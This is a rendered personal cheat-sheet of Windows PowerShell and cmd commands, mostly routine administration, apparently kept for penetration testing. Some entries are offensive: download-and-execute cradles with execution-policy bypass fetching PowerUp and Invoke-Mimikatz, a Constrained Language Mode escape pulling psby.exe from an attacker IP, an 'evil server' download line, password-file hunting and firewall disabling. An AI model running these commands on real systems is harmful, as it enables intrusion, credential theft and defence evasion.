              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/to_sort/Snippets/" class="md-nav__link">
        Snippets
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/to_sort/atom_to_sort/" class="md-nav__link">
        Atom to sort
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/to_sort/git_to_sort/" class="md-nav__link">
        Git to sort
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/to_sort/misc_to_be_sorted/" class="md-nav__link">
        Misc to be sorted
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/to_sort/to_sort/" class="md-nav__link">
        To sort
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/to_sort/virtualbox_to_sort/" class="md-nav__link">
        Virtualbox to sort
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#powershell-commands" class="md-nav__link">
    Powershell Commands
  </a>
  
    <nav class="md-nav" aria-label="Powershell Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#useful-cmdlets-and-aliases" class="md-nav__link">
    Useful Cmdlets (and aliases)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#info-gathering" class="md-nav__link">
    Info gathering:
  </a>
  
    <nav class="md-nav" aria-label="Info gathering:">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#cmd-stuff" class="md-nav__link">
    CMD stuff
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#language-mode" class="md-nav__link">
    Language Mode
  </a>
  
    <nav class="md-nav" aria-label="Language Mode">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-current-language-mode" class="md-nav__link">
    Check current language mode
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#escape-constrained-language-mode" class="md-nav__link">
    Escape Constrained Language Mode
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#where-is-a-binary" class="md-nav__link">
    Where is a binary:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#print-environment-variable" class="md-nav__link">
    Print environment variable:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-system-is-64-bit" class="md-nav__link">
    Check if system is 64 bit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enable-ise-using-powershell" class="md-nav__link">
    Enable ISE using Powershell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#securely-store-credentials-in-xml-for-import" class="md-nav__link">
    securely store credentials in xml for import
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#command-output-to-file" class="md-nav__link">
    command output to file
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#command-output-to-clipboard" class="md-nav__link">
    command output to clipboard
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-file" class="md-nav__link">
    download file
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-powerup-with-powershell-v20" class="md-nav__link">
    Download Powerup With Powershell &lt;= V.2.0
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-powerup" class="md-nav__link">
    USING POWERUP
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerup-one-liner" class="md-nav__link">
    PowerUp one-liner
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-mimikatz" class="md-nav__link">
    Powershell MIMIKATZ
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tail-a-logfile" class="md-nav__link">
    Tail a logfile
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#run-powershell-script-to-get-around-execution-of-scripts-disabled-error" class="md-nav__link">
    Run powershell script to get around execution of scripts disabled error
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-sysinternals" class="md-nav__link">
    Download SYSINTERNALS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-hostname" class="md-nav__link">
    Get hostname:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#list-local-accounts-on-a-system" class="md-nav__link">
    List local accounts on a system:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-system-is-joined-to-a-domain-or-a-workgroup" class="md-nav__link">
    Check if system is joined to a domain or a workgroup:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#set-environment-variable" class="md-nav__link">
    SET ENVIRONMENT VARIABLE
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#show-env-vars-in-running-script" class="md-nav__link">
    SHOW ENV VARS IN RUNNING SCRIPT
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-list-of-running-processes" class="md-nav__link">
    Get list of running processes:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-system-is-running-a-desktop-version-of-windows" class="md-nav__link">
    CHECK IF SYSTEM IS RUNNING A DESKTOP VERSION OF WINDOWS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-windows-kernel-version" class="md-nav__link">
    GET WINDOWS KERNEL VERSION
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-list-of-ipv4-addr" class="md-nav__link">
    GET LIST OF IPV4 ADDR
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#change-hostname" class="md-nav__link">
    CHANGE HOSTNAME
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#log-script-output-to-file" class="md-nav__link">
    LOG SCRIPT OUTPUT TO FILE
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wget" class="md-nav__link">
    WGET
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-permissions-for-folder" class="md-nav__link">
    Check Permissions For Folder
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netstat-with-find" class="md-nav__link">
    NETSTAT WITH FIND
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#look-for-files-with-passwords" class="md-nav__link">
    Look for files with passwords:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#disable-firewall" class="md-nav__link">
    Disable firewall
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#make-administrator-user-active" class="md-nav__link">
    Make administrator user active
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#set-user-password-to-never-expire" class="md-nav__link">
    Set user password to never expire
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netstat-show-listening-ports" class="md-nav__link">
    Netstat (show listening ports):
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#cmd" class="md-nav__link">
    CMD
  </a>
  
    <nav class="md-nav" aria-label="CMD">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#useful-cmd-one-liners" class="md-nav__link">
    Useful cmd one-liners:
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="windows-powershell-cmd">Windows (Powershell &amp; cmd)<a class="headerlink" href="#windows-powershell-cmd" title="Permanent link">&para;</a></h1>
<h2 id="powershell-commands">Powershell Commands<a class="headerlink" href="#powershell-commands" title="Permanent link">&para;</a></h2>
<h3 id="useful-cmdlets-and-aliases">Useful Cmdlets (and aliases)<a class="headerlink" href="#useful-cmdlets-and-aliases" title="Permanent link">&para;</a></h3>
<table>
<thead>
<tr>
<th>What it does</th>
<th>Command</th>
<th>aliases</th>
</tr>
</thead>
<tbody>
<tr>
<td>Get directory listing</td>
<td>Get-ChildItem</td>
<td>ls, dir, gci</td>
</tr>
<tr>
<td>Copy a file</td>
<td><code>Copy-Item src.txt dst.txt</code></td>
<td>cp, copy, cpi</td>
</tr>
<tr>
<td>Move a file</td>
<td><code>Move-Item src.txt dst.txt</code></td>
<td>mv, move, mi</td>
</tr>
<tr>
<td>Find text within a file (1)</td>
<td><code>Select-String -path c:\users\*.txt -pattern password</code></td>
<td></td>
</tr>
<tr>
<td>Find text within a file (2)</td>
<td><code>ls -r c:\users -file \| % {Select-String -path $_ -pattern password}</code></td>
<td></td>
</tr>
<tr>
<td>Display file contents</td>
<td><code>Get-Content file.txt</code></td>
<td>cat, type, gc)</td>
</tr>
<tr>
<td>Get present directory</td>
<td><code>Get-Location</code></td>
<td>pwd, gl</td>
</tr>
<tr>
<td>Get a process listing</td>
<td><code>Get-Process</code></td>
<td>ps, gps</td>
</tr>
<tr>
<td>Get a service listing</td>
<td><code>Get-Service</code></td>
<td></td>
</tr>
<tr>
<td>Formatting output (Format-List)</td>
<td><code>ls \| Format-List -property name</code></td>
<td></td>
</tr>
<tr>
<td>Paginating output</td>
<td><code>ls -r \| Out-Host -paging</code></td>
<td></td>
</tr>
<tr>
<td>Get the SHA1 hash of a file</td>
<td><code>Get-FileHash -Algorithm SHA1 file.txt</code></td>
<td></td>
</tr>
<tr>
<td>Exporting output to CSV</td>
<td><code>Get-Process \| Export-Csv procs.csv</code></td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="info-gathering">Info gathering:<a class="headerlink" href="#info-gathering" title="Permanent link">&para;</a></h3>
<p>Working with Zip files:</p>
<div class="codehilite"><pre><span></span><code><span class="nb">Expand-Archive</span> <span class="n">-Path</span> <span class="n">Draft</span><span class="p">.</span><span class="n">Zip</span> <span class="n">-DestinationPath</span> <span class="n">C</span><span class="p">:\</span><span class="n">Reference</span>
<span class="nb">Expand-Archive</span> <span class="n">-Path</span> <span class="n">Draft</span><span class="p">.</span><span class="n">Zip</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code>https://stackoverflow.com/questions/9682024/how-to-do-what-head-tail-more-less-sed-do-in-powershell/41626586
gc log.txt | select -first 10 # head
gc -TotalCount 10 log.txt     # also head
gc log.txt | select -last 10  # tail
gc -Tail 10 log.txt           # also tail (since PSv3), also much faster than above option
gc log.txt | more             # or less if you have it installed
gc log.txt | %{ $_ -replace &#39;\d+&#39;, &#39;($0)&#39; }         # sed
</code></pre></div>

<h4 id="cmd-stuff">CMD stuff<a class="headerlink" href="#cmd-stuff" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>cipher /U /N
</code></pre></div>

<p>Alternate Data Stream
<a href="https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/">https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/</a></p>
<h3 id="language-mode">Language Mode<a class="headerlink" href="#language-mode" title="Permanent link">&para;</a></h3>
<h4 id="check-current-language-mode">Check current language mode<a class="headerlink" href="#check-current-language-mode" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nv">$ExecutionContext</span><span class="p">.</span><span class="n">SessionState</span><span class="p">.</span><span class="n">LanguageMode</span>
</code></pre></div>

<h4 id="escape-constrained-language-mode">Escape Constrained Language Mode<a class="headerlink" href="#escape-constrained-language-mode" title="Permanent link">&para;</a></h4>
<p>Using psby.exe obtained from here: <a href="https://github.com/Resilient-Ninja/Privilege-Escalation-Windows">https://github.com/Resilient-Ninja/Privilege-Escalation-Windows</a></p>
<div class="codehilite"><pre><span></span><code>PS &gt; Invoke-WebRequest -Uri http://10.10.14.25/psby.exe -OutFile C:\windows\system32\spool\drivers\color\psby.exe

PS &gt; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U C:\windows\system32\spool\drivers\color\psby.exe
</code></pre></div>

<p><a href="https://techvomit.net/useful-powershell-commands/">https://techvomit.net/useful-powershell-commands/</a></p>
<h4 id="where-is-a-binary">Where is a binary:<a class="headerlink" href="#where-is-a-binary" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>C:\Windows\System32\where.exe cmd.exe
</code></pre></div>

<h4 id="print-environment-variable">Print environment variable:<a class="headerlink" href="#print-environment-variable" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nb">echo </span><span class="nv">$Env:Temp</span>
</code></pre></div>

<h4 id="check-if-system-is-64-bit">Check if system is 64 bit<a class="headerlink" href="#check-if-system-is-64-bit" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="no">[Environment]</span><span class="p">::</span><span class="n">Is64BitOperatingSystem</span>
</code></pre></div>

<h4 id="enable-ise-using-powershell">Enable ISE using Powershell<a class="headerlink" href="#enable-ise-using-powershell" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nb">Import-Module</span> <span class="n">ServerManager</span>
<span class="nb">Add-WindowsFeature</span> <span class="n">Powershell-ISE</span>
</code></pre></div>

<h4 id="securely-store-credentials-in-xml-for-import">securely store credentials in xml for import<a class="headerlink" href="#securely-store-credentials-in-xml-for-import" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Get-Credential</span>
<span class="nv">$cred</span> <span class="p">|</span> <span class="nb">Export-CliXml</span> <span class="p">&lt;</span><span class="n">location</span><span class="p">&gt;.</span><span class="n">clixml</span>
<span class="nv">$cred2</span> <span class="p">=</span> <span class="nb">Import-CliXml</span> <span class="p">&lt;</span><span class="n">location</span><span class="p">&gt;.</span><span class="n">clixml</span>
</code></pre></div>

<h4 id="command-output-to-file">command output to file<a class="headerlink" href="#command-output-to-file" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="p">|</span> <span class="nb">Out-File</span> <span class="p">&lt;</span><span class="n">location</span><span class="p">&gt;</span>
<span class="nb">Invoke-AllChecks</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">output</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>

<h4 id="command-output-to-clipboard">command output to clipboard<a class="headerlink" href="#command-output-to-clipboard" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="n">Command</span> <span class="p">|</span> <span class="n">Clip</span>
</code></pre></div>

<h4 id="download-file">download file<a class="headerlink" href="#download-file" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>Invoke-WebRequest -Uri $url -OutFile $output
(New-Object System.Net.WebClient).DownloadFile($url, $output)

Start-BitsTransfer -Source $url -Destination $output
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="n">powershell</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&quot;(New-Object Net.WebClient).DownloadFile(&#39;http://192.168.1.3&#39;,&#39;C:\temp\launcher.bat&#39;)&quot;</span>
</code></pre></div>

<h4 id="download-powerup-with-powershell-v20">Download Powerup With Powershell &lt;= V.2.0<a class="headerlink" href="#download-powerup-with-powershell-v20" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nv">$WebClient</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span>
<span class="nv">$WebClient</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s2">&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&quot;</span><span class="p">,</span><span class="s2">&quot;C:\Temp\PowerUp.ps1&quot;</span><span class="p">)</span>

<span class="c"># one-liner alternative:</span>
<span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s2">&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&quot;</span><span class="p">,</span><span class="s2">&quot;C:\Temp\PowerUp.ps1&quot;</span><span class="p">)</span>


<span class="c"># another one:</span>
<span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="n">-e</span> <span class="nb">IEX </span><span class="p">((</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;http://target.com:8080/robots.txt&#39;</span><span class="p">))</span>
</code></pre></div>

<h4 id="using-powerup">USING POWERUP<a class="headerlink" href="#using-powerup" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>import-module c:\PowerUp\powerup.ps1
# Run all the checks
Invoke-AllChecks
</code></pre></div>

<h4 id="powerup-one-liner">PowerUp one-liner<a class="headerlink" href="#powerup-one-liner" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>#Get PowerUp, run it, and output to a text file so we can read the output easily.
powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;); Invoke-AllChecks &gt; C:\Temp\PU.txt
</code></pre></div>

<h4 id="powershell-mimikatz">Powershell MIMIKATZ<a class="headerlink" href="#powershell-mimikatz" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz
</code></pre></div>

<h4 id="tail-a-logfile">Tail a logfile<a class="headerlink" href="#tail-a-logfile" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code># You can effectively tail -f the last two lines from a log file with the following:
Get-Content logfile.log -Tail 2 Wait
</code></pre></div>

<h4 id="run-powershell-script-to-get-around-execution-of-scripts-disabled-error">Run powershell script to get around execution of scripts disabled error<a class="headerlink" href="#run-powershell-script-to-get-around-execution-of-scripts-disabled-error" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>powershell -ExecutionPolicy Bypass -File &lt;file&gt;.ps1
</code></pre></div>

<h4 id="download-sysinternals">Download SYSINTERNALS<a class="headerlink" href="#download-sysinternals" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code># First you need to ignore ssl trust:
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# then you can download it:
(New-Object System.Net.WebClient).DownloadFile(&quot;https://download.sysinternals.com/files/SysinternalsSuite.zip&quot;,&quot;C:\Temp\sysinternals.zip&quot;)
</code></pre></div>

<h4 id="get-hostname">Get hostname:<a class="headerlink" href="#get-hostname" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nv">$env:computername</span>
</code></pre></div>

<h4 id="list-local-accounts-on-a-system">List local accounts on a system:<a class="headerlink" href="#list-local-accounts-on-a-system" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_UserAccount</span> <span class="n">-Filter</span> <span class="s2">&quot;LocalAccount=&#39;True&#39;&quot;</span>
</code></pre></div>

<h4 id="check-if-system-is-joined-to-a-domain-or-a-workgroup">Check if system is joined to a domain or a workgroup:<a class="headerlink" href="#check-if-system-is-joined-to-a-domain-or-a-workgroup" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="k">if</span> <span class="p">((</span><span class="nb">gwmi </span><span class="n">win32_computersystem</span><span class="p">).</span><span class="n">partofdomain</span> <span class="o">-eq</span> <span class="nv">$true</span><span class="p">)</span> <span class="p">{</span> <span class="nb">write-host</span> <span class="n">-fore</span> <span class="n">green</span> <span class="s1">&#39;This system is on a domain&#39;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nb">write-host</span> <span class="n">-fore</span> <span class="n">red</span> <span class="s1">&#39;This system is part of a workgroup&#39;</span> <span class="p">}</span>
</code></pre></div>

<h4 id="set-environment-variable">SET ENVIRONMENT VARIABLE<a class="headerlink" href="#set-environment-variable" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nv">$env</span><span class="p">:&lt;</span><span class="n">name</span><span class="p">&gt;=</span><span class="s2">&quot;stuff&quot;</span>
</code></pre></div>

<h4 id="show-env-vars-in-running-script">SHOW ENV VARS IN RUNNING SCRIPT<a class="headerlink" href="#show-env-vars-in-running-script" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>gci env:* | sort-object &lt;name&gt;
Resource: https://stackoverflow.com/questions/39800481/display-all-environment-variables-from-running-powershell-script
</code></pre></div>

<h4 id="get-list-of-running-processes">Get list of running processes:<a class="headerlink" href="#get-list-of-running-processes" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>Get-Process

Get-WmiObject win32_process | Select-Object Name,@{n=&#39;Owner&#39;;e={$_.GetOwner().User}}
</code></pre></div>

<h4 id="check-if-system-is-running-a-desktop-version-of-windows">CHECK IF SYSTEM IS RUNNING A DESKTOP VERSION OF WINDOWS<a class="headerlink" href="#check-if-system-is-running-a-desktop-version-of-windows" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>$windesktop = (gwmi win32_operatingsystem).OperatingSystemSKU -notmatch &quot;(\b[7-9]|10|1[2-5]|1[7-9]|2[0-5])&quot;
if ($windesktop)
{
    write-output &quot;OS is a flavor of Windows Desktop&quot;
}
</code></pre></div>

<h4 id="get-windows-kernel-version">GET WINDOWS KERNEL VERSION<a class="headerlink" href="#get-windows-kernel-version" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>[Environment]::OSVersion.Version
</code></pre></div>

<h4 id="get-list-of-ipv4-addr">GET LIST OF IPV4 ADDR<a class="headerlink" href="#get-list-of-ipv4-addr" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>(gwmi Win32_NetworkAdapterConfiguration | ? { $_.IPAddress -ne $null }).ipaddress
</code></pre></div>

<h4 id="change-hostname">CHANGE HOSTNAME<a class="headerlink" href="#change-hostname" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>Get-WmiObject -Class Win32_ComputerSystem
$ComputerInfo.Rename(&quot;new_name&quot;)
</code></pre></div>

<h4 id="log-script-output-to-file">LOG SCRIPT OUTPUT TO FILE<a class="headerlink" href="#log-script-output-to-file" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>Start-Transcript -path c:\windows\temp\interesting.log -Append -force

# do stuff

stop-transcript
exit 1001
</code></pre></div>

<h4 id="wget">WGET<a class="headerlink" href="#wget" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>wget http://&lt;evil server&gt;/evil.exe -Outfile evil.exe
</code></pre></div>

<h4 id="check-permissions-for-folder">Check Permissions For Folder<a class="headerlink" href="#check-permissions-for-folder" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>icacls &lt;path&gt;
</code></pre></div>

<h4 id="netstat-with-find">NETSTAT WITH FIND<a class="headerlink" href="#netstat-with-find" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code># This is an example of what I equate to running netstat and piping the results through grep in linux. In powershell however, you need to escape the double ticks or it will throw an error:

netstat -anob  | find `&quot;443`&quot;
</code></pre></div>

<h4 id="look-for-files-with-passwords">Look for files with passwords:<a class="headerlink" href="#look-for-files-with-passwords" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>dir /b /s web.config
dir /b /s unattend.xml
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*
</code></pre></div>

<h4 id="disable-firewall">Disable firewall<a class="headerlink" href="#disable-firewall" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>netsh advfirewall set allprofiles state off
</code></pre></div>

<h4 id="make-administrator-user-active">Make administrator user active<a class="headerlink" href="#make-administrator-user-active" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>net user administrator /active:yes
</code></pre></div>

<h4 id="set-user-password-to-never-expire">Set user password to never expire<a class="headerlink" href="#set-user-password-to-never-expire" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>net user user /expires:never /active:yes /logonpasswordchg:no
</code></pre></div>

<h4 id="netstat-show-listening-ports">Netstat (show listening ports):<a class="headerlink" href="#netstat-show-listening-ports" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>cmd /c &quot;netstat -a&quot;
</code></pre></div>

<h2 id="cmd">CMD<a class="headerlink" href="#cmd" title="Permanent link">&para;</a></h2>
<h3 id="useful-cmd-one-liners">Useful cmd one-liners:<a class="headerlink" href="#useful-cmd-one-liners" title="Permanent link">&para;</a></h3>
<p>Open event viewer from cmd:</p>
<div class="codehilite"><pre><span></span><code>eventvwr
</code></pre></div>

<p>View the status of a service:</p>
<div class="codehilite"><pre><span></span><code>sc query &lt;service name&gt;
</code></pre></div>

<p>Stop service:</p>
<div class="codehilite"><pre><span></span><code>sc stop &lt;service name&gt;
</code></pre></div>

<p>Start service:</p>
<div class="codehilite"><pre><span></span><code>sc start &lt;servicename&gt;
</code></pre></div>

<p>Open services msc:</p>
<div class="codehilite"><pre><span></span><code>services.msc
</code></pre></div>

<p>Lists all the service information for each process:</p>
<div class="codehilite"><pre><span></span><code>tasklist /svc
</code></pre></div>

<p>Kill a process by PID:</p>
<div class="codehilite"><pre><span></span><code>taskkill /pid &lt;pid&gt; /f
</code></pre></div>

<p>Kill firefox (or any process) by name:</p>
<div class="codehilite"><pre><span></span><code>taskkill /im firefox.exe /f
</code></pre></div>

<p>Delete a file:</p>
<div class="codehilite"><pre><span></span><code>del &lt;file name&gt;
</code></pre></div>

<p>List drives:</p>
<div class="codehilite"><pre><span></span><code>fsutil fsinfo drives
</code></pre></div>

<p>Show users with active sessions:</p>
<div class="codehilite"><pre><span></span><code>quser or query user
</code></pre></div>

<p>Show active network sessions:</p>
<div class="codehilite"><pre><span></span><code>netstat -vb
</code></pre></div>

<p>Get last modified file in a directory (conceptually similar to ls -lart):</p>
<div class="codehilite"><pre><span></span><code>dir /O:D /T:W /A:-D
</code></pre></div>

<p>Rename file:</p>
<div class="codehilite"><pre><span></span><code>move file new-file-name
</code></pre></div>

<p>Show contents of file:</p>
<div class="codehilite"><pre><span></span><code>type file.txt
</code></pre></div>

<p>Current current user and privilege info</p>
<div class="codehilite"><pre><span></span><code>whoami /all
</code></pre></div>

<p>List users</p>
<div class="codehilite"><pre><span></span><code>net users
</code></pre></div>

<p>List domain users and output to a file</p>
<div class="codehilite"><pre><span></span><code>net user /domain &gt; domain-user-list.txt
</code></pre></div>

<p>List domain controller the current system is authenticated with</p>
<div class="codehilite"><pre><span></span><code>echo %LOGONSERVER%
</code></pre></div>

<p>Get FSMO roles for current domain (useful info about domain controller setup)</p>
<div class="codehilite"><pre><span></span><code>NETDOM QUERY /D:targetdomain.com FSMO
</code></pre></div>

<p>List all domain controllers in the current domain</p>
<div class="codehilite"><pre><span></span><code>net group &quot;Domain Controllers&quot; /domain
</code></pre></div>

<p>Print password policy</p>
<div class="codehilite"><pre><span></span><code>net accounts
</code></pre></div>

<p>Reboot system</p>
<div class="codehilite"><pre><span></span><code>shutdown -r
</code></pre></div>

<p>Query the registry</p>
<div class="codehilite"><pre><span></span><code>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
</code></pre></div>

<p>Remove a key from the registry</p>
<div class="codehilite"><pre><span></span><code>reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ /v hFaZvOAsF /f
</code></pre></div>

<p>Show environment variables</p>
<div class="codehilite"><pre><span></span><code>set
</code></pre></div>





                
              </article>
            </div>
          
          
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.b425cdc4.min.js"></script>
      
    
  </body>
</html>